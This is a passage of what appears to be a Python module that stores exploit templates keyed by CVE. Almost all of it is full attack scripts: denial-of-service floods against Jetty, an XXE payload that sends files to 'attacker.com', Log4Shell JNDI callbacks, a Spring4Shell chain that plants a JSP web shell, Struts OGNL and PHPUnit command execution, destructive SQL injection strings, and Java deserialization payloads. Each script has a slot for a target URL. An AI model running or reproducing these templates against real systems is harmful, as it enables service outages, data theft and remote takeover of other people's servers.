        cwe_name="Uncontrolled Resource Consumption",
        name="Eclipse Jetty DosFilter Memory Exhaustion",
        severity="High",
        protocol="HTTP",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.54", "Eclipse Jetty 10.x < 10.0.18", "Eclipse Jetty 11.x < 11.0.18"],
        description="DosFilter can be bypassed to cause OutOfMemory errors via crafted requests, leading to DoS.",
        exploit_template='''import requests
import threading
import argparse
import time
from datetime import datetime

# CVE-2024-9823: Jetty DosFilter Memory Exhaustion
# CWE-400: Uncontrolled Resource Consumption

parser = argparse.ArgumentParser(description="CVE-2024-9823 Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL")
parser.add_argument("--threads", type=int, default=20, help="Number of threads")
args = parser.parse_args()

target = args.target
num_threads = args.threads

results = {"requests_sent": 0, "oom_detected": False, "success": False}
stop_flag = False

def print_banner():
    print("=" * 60)
    print("CVE-2024-9823 - Jetty DosFilter Bypass DoS")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target}")
    print("=" * 60)

def attack_thread():
    global results, stop_flag
    
    # Large payload to exhaust memory
    large_payload = "A" * 100000
    
    while not stop_flag:
        try:
            # Craft request to bypass DosFilter rate limiting
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Forwarded-For": f"10.{results['requests_sent'] % 256}.{(results['requests_sent'] // 256) % 256}.1",
            }
            
            response = requests.post(
                target,
                data={"data": large_payload},
                headers=headers,
                timeout=30
            )
            results["requests_sent"] += 1
            
        except requests.exceptions.Timeout:
            results["success"] = True
        except Exception as e:
            error_str = str(e).lower()
            if "memory" in error_str or "heap" in error_str:
                results["oom_detected"] = True
                results["success"] = True
            if "reset" in error_str or "refused" in error_str:
                results["success"] = True

def exploit():
    global stop_flag, results
    print_banner()
    
    threads = []
    print(f"[*] Launching {num_threads} attack threads...")
    
    for i in range(num_threads):
        t = threading.Thread(target=attack_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    
    # Run for limited time
    attack_duration = 60
    print(f"[*] Attack running for {attack_duration} seconds...")
    
    for i in range(attack_duration // 5):
        time.sleep(5)
        print(f"    Requests sent: {results['requests_sent']}")
        
        if results["oom_detected"]:
            print("[+] OutOfMemory detected!")
            break
    
    stop_flag = True
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target}")
    print(f"Requests Sent: {results['requests_sent']}")
    print(f"OOM Detected: {results['oom_detected']}")
    print(f"DoS Success: {results['success']}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["OutOfMemory", "timeout", "reset", "heap"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2024-9823"]
    ),
    
    "CVE-2024-22201": CVEExploitTemplate(
        cve_id="CVE-2024-22201",
        cwe="CWE-404",
        cwe_name="Improper Resource Shutdown or Release",
        name="Eclipse Jetty HTTP/2 SSL Connection Leak DoS",
        severity="Medium",
        protocol="HTTPS",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.54", "Eclipse Jetty 10.x < 10.0.19", "Eclipse Jetty 11.x < 11.0.19"],
        description="HTTP/2 SSL connections that become congested and timeout will leak, causing file descriptor exhaustion.",
        exploit_template='''import socket
import ssl
import threading
import argparse
import time
from datetime import datetime

# CVE-2024-22201: Jetty HTTP/2 SSL Connection Leak
# CWE-404: Improper Resource Shutdown or Release

parser = argparse.ArgumentParser(description="CVE-2024-22201 Exploit")
parser.add_argument("--target", default="__TARGET_IP_PLACEHOLDER__", help="Target IP")
parser.add_argument("--port", type=int, default=8443, help="Target HTTPS port")
parser.add_argument("--connections", type=int, default=100, help="Number of connections")
args = parser.parse_args()

target_ip = args.target
target_port = args.port
num_connections = args.connections

results = {"connections_made": 0, "leaked": 0, "success": False}

def print_banner():
    print("=" * 60)
    print("CVE-2024-22201 - Jetty HTTP/2 SSL Connection Leak")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target_ip}:{target_port}")
    print(f"[*] Connections: {num_connections}")
    print("=" * 60)

def create_congested_connection():
    global results
    
    try:
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        
        ssl_sock = context.wrap_socket(sock, server_hostname=target_ip)
        ssl_sock.connect((target_ip, target_port))
        
        # Send HTTP/2 preface
        ssl_sock.send(b"PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n")
        
        # Don't read response - create congestion
        # Send large amount of data without reading
        for _ in range(100):
            try:
                ssl_sock.send(b"X" * 16384)
            except:
                break
        
        results["connections_made"] += 1
        results["leaked"] += 1
        
        # Don't close - let it leak
        return ssl_sock
        
    except Exception as e:
        if "refused" in str(e).lower():
            results["success"] = True  # FD exhaustion
        return None

def exploit():
    print_banner()
    
    connections = []
    print(f"[*] Creating {num_connections} congested SSL connections...")
    
    for i in range(num_connections):
        conn = create_congested_connection()
        if conn:
            connections.append(conn)
        
        if (i + 1) % 10 == 0:
            print(f"    Created {i + 1} connections, leaked: {results['leaked']}")
        
        time.sleep(0.1)  # Small delay
    
    print(f"[*] Waiting for connections to timeout and leak...")
    time.sleep(30)
    
    # Test if server accepting new connections
    try:
        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        test_sock.settimeout(5)
        test_sock.connect((target_ip, target_port))
        test_sock.close()
        print("[*] Server still accepting connections")
    except:
        print("[+] Server refusing connections - FD exhaustion!")
        results["success"] = True
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target_ip}:{target_port}")
    print(f"Connections Made: {results['connections_made']}")
    print(f"Connections Leaked: {results['leaked']}")
    print(f"FD Exhaustion: {results['success']}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["refused", "exhaustion", "leaked", "timeout"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2024-22201"]
    ),
    
    "GHSA-58qw-p7qm-5rvh": CVEExploitTemplate(
        cve_id="GHSA-58qw-p7qm-5rvh",
        cwe="CWE-611",
        cwe_name="XML External Entity (XXE) Injection",
        name="Eclipse Jetty XmlParser XXE Injection",
        severity="Medium",
        protocol="HTTP",
        affected_products=["Eclipse Jetty 9.4.x < 9.4.52", "Eclipse Jetty 10.x < 10.0.16", "Eclipse Jetty 11.x < 11.0.16"],
        description="Jetty's XmlParser allows arbitrary DOCTYPE declarations, enabling XXE injection for data exfiltration.",
        exploit_template='''import requests
import argparse
from datetime import datetime

# GHSA-58qw-p7qm-5rvh: Jetty XmlParser XXE Injection
# CWE-611: Improper Restriction of XML External Entity Reference

parser = argparse.ArgumentParser(description="Jetty XXE Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL")
parser.add_argument("--file", default="/etc/passwd", help="File to exfiltrate")
args = parser.parse_args()

target = args.target
file_to_read = args.file

def print_banner():
    print("=" * 60)
    print("GHSA-58qw-p7qm-5rvh - Jetty XmlParser XXE")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target}")
    print(f"[*] Target File: {file_to_read}")
    print("=" * 60)

def exploit():
    print_banner()
    
    results = {"success": False, "file_read": False, "content": ""}
    
    # XXE payloads for different scenarios
    xxe_payloads = [
        # Basic XXE
        '<?xml version="1.0"?>\\n<!DOCTYPE foo [\\n  <!ENTITY xxe SYSTEM "file://' + file_to_read + '">\\n]>\\n<config>&xxe;</config>',
        
        # Parameter entity XXE
        '<?xml version="1.0"?>\\n<!DOCTYPE foo [\\n  <!ENTITY % file SYSTEM "file://' + file_to_read + '">\\n  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?d=%file;\'>">\\n  %eval;\\n]>\\n<config>test</config>',
        
        # XInclude
        '<?xml version="1.0"?>\\n<config xmlns:xi="http://www.w3.org/2001/XInclude">\\n  <xi:include href="file://' + file_to_read + '" parse="text"/>\\n</config>',
    ]
    
    # Common Jetty XML endpoints
    endpoints = [
        "/",
        "/api/config",
        "/webapps",
        "/admin",
        "/WEB-INF",
    ]
    
    for endpoint in endpoints:
        for payload in xxe_payloads:
            full_url = target.rstrip("/") + endpoint
            print(f"\\n[*] Testing: {endpoint}")
            
            headers = {
                "Content-Type": "application/xml",
            }
            
            try:
                response = requests.post(
                    full_url,
                    data=payload,
                    headers=headers,
                    timeout=10
                )
                
                print(f"    Status: {response.status_code}")
                
                # Check for file content indicators
                if "root:" in response.text or "/bin/" in response.text:
                    print(f"[+] XXE SUCCESSFUL! File content retrieved:")
                    print("-" * 40)
                    print(response.text[:500])
                    print("-" * 40)
                    results["success"] = True
                    results["file_read"] = True
                    results["content"] = response.text
                    break
                    
                # Check for Windows file content
                if "[boot loader]" in response.text or "Windows" in response.text:
                    print(f"[+] XXE SUCCESSFUL! Windows file content:")
                    print(response.text[:500])
                    results["success"] = True
                    results["file_read"] = True
                    results["content"] = response.text
                    break
                    
            except Exception as e:
                print(f"    Error: {e}")
        
        if results["success"]:
            break
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target}")
    print(f"File Requested: {file_to_read}")
    print(f"XXE Success: {results['success']}")
    print(f"File Read: {results['file_read']}")
    if results['content']:
        print(f"Content Preview: {results['content'][:100]}...")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["root:", "/bin/", "passwd", "Windows", "boot loader"],
        references=["https://github.com/eclipse/jetty.project/security/advisories/GHSA-58qw-p7qm-5rvh"]
    ),
    
    "CVE-2023-41900": CVEExploitTemplate(
        cve_id="CVE-2023-41900",
        cwe="CWE-287",
        cwe_name="Improper Authentication",
        name="Eclipse Jetty OpenIdAuthenticator Authentication Bypass",
        severity="Medium",
        protocol="HTTP",
        affected_products=["Eclipse Jetty 9.4.21 - 9.4.51", "Eclipse Jetty 10.x < 10.0.16", "Eclipse Jetty 11.x < 11.0.16"],
        description="When using OpenIdAuthenticator with a nested LoginService, revoked users can bypass authentication.",
        exploit_template='''import requests
import argparse
from datetime import datetime

# CVE-2023-41900: Jetty OpenIdAuthenticator Authentication Bypass
# CWE-287: Improper Authentication

parser = argparse.ArgumentParser(description="CVE-2023-41900 Exploit")
parser.add_argument("--target", default="__TARGET_PLACEHOLDER__", help="Target URL")
parser.add_argument("--username", default="revoked_user", help="Revoked username")
args = parser.parse_args()

target = args.target
username = args.username

def print_banner():
    print("=" * 60)
    print("CVE-2023-41900 - Jetty OpenID Auth Bypass")
    print("=" * 60)
    print(f"[*] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[*] Target: {target}")
    print(f"[*] Username: {username}")
    print("=" * 60)

def exploit():
    print_banner()
    
    results = {"success": False, "bypassed": False, "evidence": []}
    
    # Test protected endpoints
    protected_endpoints = [
        "/admin",
        "/protected",
        "/api/admin",
        "/management",
        "/dashboard",
    ]
    
    # Session with potentially revoked credentials
    session = requests.Session()
    
    # Craft authentication headers that might bypass revocation
    auth_headers = {
        "X-Forwarded-User": username,
        "X-Remote-User": username,
        "Authorization": f"Bearer fake_token_for_{username}",
    }
    
    for endpoint in protected_endpoints:
        full_url = target.rstrip("/") + endpoint
        print(f"\\n[*] Testing: {endpoint}")
        
        try:
            # Try without auth first
            response_noauth = session.get(full_url, timeout=10)
            print(f"    Without auth: {response_noauth.status_code}")
            
            # Try with potentially bypassed auth
            response_auth = session.get(
                full_url,
                headers=auth_headers,
                timeout=10
            )
            print(f"    With headers: {response_auth.status_code}")
            
            # Check for auth bypass
            if response_noauth.status_code in [401, 403] and response_auth.status_code == 200:
                print(f"[+] AUTH BYPASS DETECTED!")
                print(f"[+] Protected endpoint accessible with revoked credentials")
                results["success"] = True
                results["bypassed"] = True
                results["evidence"].append(f"Bypassed {endpoint}")
                
            elif response_auth.status_code == 200 and "login" not in response_auth.text.lower():
                print(f"[+] Possible bypass - got 200 response")
                results["evidence"].append(f"200 response on {endpoint}")
                
        except Exception as e:
            print(f"    Error: {e}")
    
    # Summary
    print("\\n" + "=" * 60)
    print("EXPLOITATION SUMMARY")
    print("=" * 60)
    print(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"Target: {target}")
    print(f"Auth Bypass: {results['bypassed']}")
    if results['evidence']:
        print(f"Evidence: {', '.join(results['evidence'])}")
    print("=" * 60)
    
    return results["success"]

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["bypass", "200", "admin", "dashboard"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2023-41900"]
    ),
    
    # =========================================================================
    # LOG4J CVEs
    # =========================================================================
    
    "CVE-2021-44228": CVEExploitTemplate(
        cve_id="CVE-2021-44228",
        cwe="CWE-917",
        cwe_name="Expression Language Injection",
        name="Log4Shell - Log4j JNDI Injection RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Log4j 2.0-2.14.1"],
        description="Log4j 2.x allows JNDI lookup in log messages, enabling RCE via ${jndi:ldap://attacker.com/a} payloads.",
        exploit_template='''import requests

# CVE-2021-44228: Log4Shell - JNDI Injection RCE
# CWE-917: Expression Language Injection

target = "__TARGET_PLACEHOLDER__"
attacker_ldap = "ldap://YOUR_IP:1389/a"  # Start LDAP/RMI server first

def exploit():
    print(f"[*] CVE-2021-44228 - Log4Shell")
    print(f"[*] Target: {target}")
    print(f"[*] Callback: {attacker_ldap}")
    
    # Injection points - any logged user input
    injection_points = [
        ("User-Agent", "${{jndi:{attacker_ldap}}}"),
        ("X-Forwarded-For", "${{jndi:{attacker_ldap}}}"),
        ("X-Api-Version", "${{jndi:{attacker_ldap}}}"),
        ("Authorization", "Bearer ${{jndi:{attacker_ldap}}}"),
    ]
    
    # Payload variants for WAF bypass
    payloads = [
        f"${{jndi:ldap://{attacker_ldap}}}",
        f"${{jndi:${{lower:l}}${{lower:d}}${{lower:a}}${{lower:p}}://{attacker_ldap}}}",
        f"${{${{::-j}}ndi:ldap://{attacker_ldap}}}",
        f"${{jndi:rmi://{attacker_ldap}}}",
    ]
    
    for payload in payloads:
        headers = {{
            "User-Agent": payload,
            "X-Forwarded-For": payload,
            "X-Api-Version": payload,
        }}
        
        print(f"[*] Sending payload in headers...")
        
        try:
            response = requests.get(target, headers=headers, timeout=5)
            print(f"[*] Response: {response.status_code}")
        except:
            pass
    
    print("[*] Check your LDAP server for callbacks!")
    print("[*] Setup: java -jar JNDI-Injection-Exploit.jar -C 'cmd' -A YOUR_IP")

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["callback", "LDAP connection", "RMI connection"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
    ),
    
    # =========================================================================
    # SPRING FRAMEWORK CVEs
    # =========================================================================
    
    "CVE-2022-22965": CVEExploitTemplate(
        cve_id="CVE-2022-22965",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="Spring4Shell - Spring Framework RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Spring Framework 5.3.0-5.3.17", "Spring Framework 5.2.0-5.2.19"],
        description="Spring Framework allows class loader manipulation via data binding, leading to RCE through Tomcat's AccessLogValve.",
        exploit_template='''import requests

# CVE-2022-22965: Spring4Shell RCE
# CWE-94: Code Injection
# Requires: JDK 9+, Tomcat deployment

target = "__TARGET_PLACEHOLDER__"

def exploit():
    print(f"[*] CVE-2022-22965 - Spring4Shell")
    print(f"[*] Target: {target}")
    
    # Payload to modify AccessLogValve and write JSP shell
    headers = {{"Content-Type": "application/x-www-form-urlencoded"}}
    
    # Step 1: Modify logging pattern to inject JSP code
    payloads = [
        "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di",
        "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp",
        "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT",
        "class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell",
        "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=",
    ]
    
    for payload in payloads:
        try:
            response = requests.post(
                target,
                data=payload,
                headers=headers,
                timeout=10
            )
            print(f"[*] Sent: {payload[:50]}... Status: {response.status_code}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    # Step 2: Trigger log write
    print("[*] Triggering shell creation...")
    requests.get(target, headers={{"suffix": "%>//", "c1": "Runtime", "c2": "<%", "DNT": "1"}})
    
    # Step 3: Access shell
    shell_url = target.rstrip("/") + "/shell.jsp"
    print(f"[*] Shell URL: {shell_url}?pwd=j&cmd=whoami")
    
    try:
        r = requests.get(f"{shell_url}?pwd=j&cmd=whoami", timeout=10)
        if r.status_code == 200:
            print(f"[+] RCE CONFIRMED!\\n{r.text}")
    except:
        pass

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["uid=", "whoami", "shell.jsp"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"]
    ),
    
    # =========================================================================
    # GENERAL WEB VULNERABILITIES
    # =========================================================================
    
    "CWE-89": CVEExploitTemplate(
        cve_id="CWE-89",
        cwe="CWE-89",
        cwe_name="SQL Injection",
        name="SQL Injection",
        severity="High",
        protocol="HTTP",
        affected_products=["Generic"],
        description="SQL Injection occurs when user input is concatenated into SQL queries without proper sanitization.",
        exploit_template='''import requests

# CWE-89: SQL Injection
target = "__TARGET_PLACEHOLDER__"

def exploit():
    print(f"[*] Testing SQL Injection")
    print(f"[*] Target: {target}")
    
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "admin'--",
        "' UNION SELECT NULL,NULL,NULL--",
        "'; DROP TABLE users;--",
        "1' AND (SELECT SLEEP(5))--",  # Time-based blind
    ]
    
    for payload in payloads:
        print(f"[*] Trying: {payload}")
        
        try:
            response = requests.post(
                target,
                data={{"username": payload, "password": "test"}},
                timeout=10
            )
            
            # Check for success indicators
            if any(x in response.text.lower() for x in ["welcome", "logged in", "dashboard"]):
                print(f"[+] SQL Injection successful!")
                return True
                
            if response.elapsed.total_seconds() > 4:
                print(f"[+] Time-based blind SQLi detected!")
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["Welcome", "logged in", "dashboard", "error", "SQL"],
        references=["https://cwe.mitre.org/data/definitions/89.html"]
    ),
    
    "CWE-502": CVEExploitTemplate(
        cve_id="CWE-502",
        cwe="CWE-502",
        cwe_name="Deserialization of Untrusted Data",
        name="Java Deserialization",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Java Applications"],
        description="Insecure deserialization of untrusted data can lead to remote code execution through gadget chains.",
        exploit_template='''import requests
import subprocess

# CWE-502: Java Deserialization RCE
target = "__TARGET_PLACEHOLDER__"

def generate_payload(command):
    """Generate ysoserial payload."""
    try:
        result = subprocess.run(
            ["java", "-jar", "ysoserial.jar", "CommonsCollections5", command],
            capture_output=True
        )
        return result.stdout
    except:
        print("[-] ysoserial.jar not found")
        return None

def exploit():
    print(f"[*] Testing Java Deserialization")
    print(f"[*] Target: {target}")
    
    # Common deserialization endpoints
    endpoints = [
        "/api/deserialize",
        "/invoke",
        "/jmx",
        "/remoting",
    ]
    
    gadget_chains = [
        "CommonsCollections5",
        "CommonsCollections6",
        "Jdk7u21",
        "Spring1",
    ]
    
    for endpoint in endpoints:
        print(f"[*] Testing endpoint: {endpoint}")
        
        payload = generate_payload("touch /tmp/pwned")
        if payload:
            try:
                response = requests.post(
                    f"{target}{endpoint}",
                    data=payload,
                    headers={{"Content-Type": "application/x-java-serialized-object"}},
                    timeout=10
                )
                print(f"[*] Response: {response.status_code}")
            except:
                pass

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["500", "Exception", "ClassNotFoundException"],
        references=["https://cwe.mitre.org/data/definitions/502.html"]
    ),
    
    # =========================================================================
    # APACHE STRUTS CVEs
    # =========================================================================
    
    "CVE-2017-5638": CVEExploitTemplate(
        cve_id="CVE-2017-5638",
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        name="Apache Struts 2 OGNL Injection RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Struts 2.3.5-2.3.31", "Apache Struts 2.5-2.5.10"],
        description="Apache Struts 2 allows RCE via a crafted Content-Type header containing OGNL expressions when the Jakarta Multipart parser is used.",
        exploit_template='''import requests

# CVE-2017-5638: Apache Struts 2 OGNL Injection RCE
# CWE-78: OS Command Injection

target = "__TARGET_PLACEHOLDER__"

def exploit(cmd="id"):
    print(f"[*] CVE-2017-5638 - Struts2 OGNL Injection")
    print(f"[*] Target: {target}")
    print(f"[*] Command: {cmd}")
    
    # OGNL payload in Content-Type header
    payload = f"""%{{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='{cmd}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{{'cmd','/c',#cmd}}:{{'/bin/sh','-c',#cmd}})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}}"""
    
    headers = {{
        "Content-Type": payload,
        "User-Agent": "CVE-2017-5638"
    }}
    
    try:
        response = requests.get(target, headers=headers, timeout=10)
        print(f"[*] Response Status: {response.status_code}")
        
        if response.text:
            print(f"[+] Command output:")
            print(response.text)
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["uid=", "root", "www-data"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"]
    ),
    
    "CVE-2018-11776": CVEExploitTemplate(
        cve_id="CVE-2018-11776",
        cwe="CWE-78",
        cwe_name="OS Command Injection",
        name="Apache Struts 2 Namespace RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Apache Struts 2.3-2.3.34", "Apache Struts 2.5-2.5.16"],
        description="Apache Struts 2 allows RCE when alwaysSelectFullNamespace is true and the action mapped has a wildcard namespace.",
        exploit_template='''import requests

# CVE-2018-11776: Apache Struts 2 Namespace RCE
# CWE-78: OS Command Injection

target = "__TARGET_PLACEHOLDER__"

def exploit(cmd="id"):
    print(f"[*] CVE-2018-11776 - Struts2 Namespace RCE")
    
    # OGNL payload in URL namespace
    payload = f"""/${{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()).(#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('{cmd}')).(#b=#a.getInputStream()).(#c=new java.io.InputStreamReader(#b)).(#d=new java.io.BufferedReader(#c)).(#e=new char[50000]).(#d.read(#e)).(#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse")).(#f.getWriter().println(new java.lang.String(#e))).(#f.getWriter().flush())}}/"""
    
    try:
        response = requests.get(target + payload, timeout=10)
        if response.text:
            print(f"[+] Output: {response.text}")
            return True
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["uid=", "root"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2018-11776"]
    ),
    
    # =========================================================================
    # JENKINS CVEs
    # =========================================================================
    
    "CVE-2019-1003000": CVEExploitTemplate(
        cve_id="CVE-2019-1003000",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="Jenkins Script Security Sandbox Bypass RCE",
        severity="Critical",
        protocol="HTTP",
        affected_products=["Jenkins Script Security Plugin < 1.50"],
        description="Jenkins Script Security sandbox can be bypassed to execute arbitrary Groovy code, leading to RCE.",
        exploit_template='''import requests

# CVE-2019-1003000: Jenkins Script Security Sandbox Bypass
# CWE-94: Code Injection

target = "__TARGET_PLACEHOLDER__"

def exploit():
    print(f"[*] CVE-2019-1003000 - Jenkins Sandbox Bypass")
    print(f"[*] Target: {target}")
    
    # Groovy payload to bypass sandbox
    groovy_payload = """
public class x {{
  public x() {{
    "touch /tmp/pwned".execute()
  }}
}}
"""
    
    # Try different endpoints
    endpoints = [
        "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
        "/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript",
    ]
    
    for endpoint in endpoints:
        print(f"[*] Trying: {endpoint}")
        
        data = {{
            "sandbox": "true",
            "value": groovy_payload
        }}
        
        try:
            response = requests.post(target + endpoint, data=data, timeout=10)
            print(f"[*] Status: {response.status_code}")
            
            if response.status_code == 200:
                print("[+] Payload sent! Check if command executed.")
                return True
        except Exception as e:
            print(f"[-] Error: {e}")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["200", "OK"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-1003000"]
    ),
    
    # =========================================================================
    # PHP CVEs
    # =========================================================================
    
    "CVE-2017-9841": CVEExploitTemplate(
        cve_id="CVE-2017-9841",
        cwe="CWE-94",
        cwe_name="Code Injection",
        name="PHPUnit Remote Code Execution",
        severity="Critical",
        protocol="HTTP",
        affected_products=["PHPUnit < 4.8.28", "PHPUnit 5.x < 5.6.3"],
        description="PHPUnit allows RCE via /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php which evaluates arbitrary PHP from POST data.",
        exploit_template='''import requests

# CVE-2017-9841: PHPUnit RCE
# CWE-94: Code Injection

target = "__TARGET_PLACEHOLDER__"

def exploit(cmd="id"):
    print(f"[*] CVE-2017-9841 - PHPUnit RCE")
    print(f"[*] Target: {target}")
    
    # Common paths to eval-stdin.php
    paths = [
        "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
        "/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    ]
    
    php_payload = f'<?php system("{cmd}"); ?>'
    
    for path in paths:
        print(f"[*] Trying: {path}")
        
        try:
            response = requests.post(
                target + path,
                data=php_payload,
                headers={{"Content-Type": "text/plain"}},
                timeout=10
            )
            
            if response.status_code == 200 and response.text:
                print(f"[+] RCE Successful!")
                print(f"[+] Output: {response.text}")
                return True
        except Exception as e:
            print(f"[-] {path}: {e}")
    
    return False

if __name__ == "__main__":
    exploit("whoami")
''',
        success_indicators=["uid=", "www-data", "root"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2017-9841"]
    ),
    
    # =========================================================================
    # WORDPRESS CVEs
    # =========================================================================
    
    "CVE-2019-8942": CVEExploitTemplate(
        cve_id="CVE-2019-8942",
        cwe="CWE-434",
        cwe_name="Unrestricted Upload",
        name="WordPress Image RCE via Crop",
        severity="High",
        protocol="HTTP",
        affected_products=["WordPress < 5.0.1", "WordPress < 4.9.9"],
        description="WordPress allows RCE by authenticated users through image metadata manipulation and crop functionality.",
        exploit_template='''import requests

# CVE-2019-8942: WordPress Image RCE
# CWE-434: Unrestricted Upload
# Requires: Author-level access

target = "__TARGET_PLACEHOLDER__"
username = "author"
password = "password"

def exploit():
    print(f"[*] CVE-2019-8942 - WordPress Image RCE")
    print(f"[*] Target: {target}")
    
    session = requests.Session()
    
    # Step 1: Login
    login_url = f"{target}/wp-login.php"
    login_data = {{
        "log": username,
        "pwd": password,
        "wp-submit": "Log In"
    }}
    
    print("[*] Logging in...")
    response = session.post(login_url, data=login_data)
    
    if "dashboard" in response.text.lower():
        print("[+] Login successful!")
    else:
        print("[-] Login failed")
        return False
    
    # Step 2: Upload malicious image with PHP in EXIF
    print("[*] This exploit requires:")
    print("    1. Upload image with PHP payload in EXIF Comment")
    print("    2. Trigger crop action to create new file")
    print("    3. Include via path traversal")
    
    return False

if __name__ == "__main__":
    exploit()
''',
        success_indicators=["404", "shell", "php"],
        references=["https://nvd.nist.gov/vuln/detail/CVE-2019-8942"]
    ),
    
    # =========================================================================
    # CONFLUENCE CVEs  
    # =========================================================================
    
    "CVE-2021-26084": CVEExploitTemplate(
        cve_id="CVE-2021-26084",
        cwe="CWE-917",
        cwe_name="Expression Language Injection",
        name="Atlassian Confluence OGNL Injection RCE",
        severity="Critical",
        protocol="HTTP",
